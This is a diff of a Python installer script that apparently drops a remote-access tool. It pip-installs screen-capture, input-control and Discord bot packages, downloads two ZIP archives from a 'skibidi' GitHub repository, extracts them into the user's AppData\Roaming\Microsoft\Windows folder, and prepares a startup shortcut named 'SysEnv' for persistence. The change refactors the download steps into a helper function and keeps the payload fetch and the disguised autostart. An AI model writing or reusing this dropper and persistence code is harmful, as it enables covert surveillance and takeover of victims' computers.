@@ -5,6 +5,11 @@ import time
 import zipfile
 from pathlib import Path
 
+
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+os.makedirs(target_path, exist_ok=True)
+
 required_packages = [
     'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
     'pyautogui', 'Pillow', 'nextcord', 'requests',
@@ -24,6 +29,30 @@ def install_packages():
     for package in required_packages:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
+def download_and_extract(url, filename):
+    print(f"Downloading {filename}...")
+    r = requests.get(url, allow_redirects=True)
+    if r.status_code != 200:
+        print(f"Failed to download {filename}. Status code: {r.status_code}")
+        return
+
+    print("Download complete.")
+    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
+    
+    print(f"Writing {filename}...")
+    with open(file_path, 'wb') as file:
+        file.write(r.content)
+    print("Writing complete.")
+
+    print(f"Extracting {filename}...")
+    try:
+        with zipfile.ZipFile(file_path, 'r') as zip_ref:
+            zip_ref.extractall(target_path)
+        os.remove(file_path)
+        print("Extracting complete.")
+    except zipfile.BadZipFile:
+        print(f"Error: {filename} is not a valid ZIP file.")
+
 install_package()
 install_packages()
 
@@ -34,36 +63,8 @@ time.sleep(3)
 import requests
 import win32com.client
 
-user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-os.makedirs(target_path, exist_ok=True)
-
-print("Downloading skibidi...")
-r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", allow_redirects=True)
-print("Download complete.")
-print("Writing skibidi...")
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-main.zip')
-open(file_path, 'wb').write(r.content)
-print("Writing complete.")
-print("Extracting skibidi...")
-with zipfile.ZipFile(file_path, 'r') as zip_ref:
-    zip_ref.extractall(target_path)
-os.remove(file_path)
-
-print("Extracting complete.")
-print("Downloading skibidi-startup...")
-r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
-print("Download complete.")
-print("Writing skibidi-startup...")
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
-open(file_path, 'wb').write(r.content)
-print("Writing complete.")
-print("Extracting skibidi-startup...")
-with zipfile.ZipFile(file_path, 'r') as zip_ref:
-    zip_ref.extractall(target_path)
-os.remove(file_path)
-print("Extracting complete.")
-print("Creating shortcut...")
+download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", "skibidi-main.zip")
+download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", "skibidi-startup.zip")
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
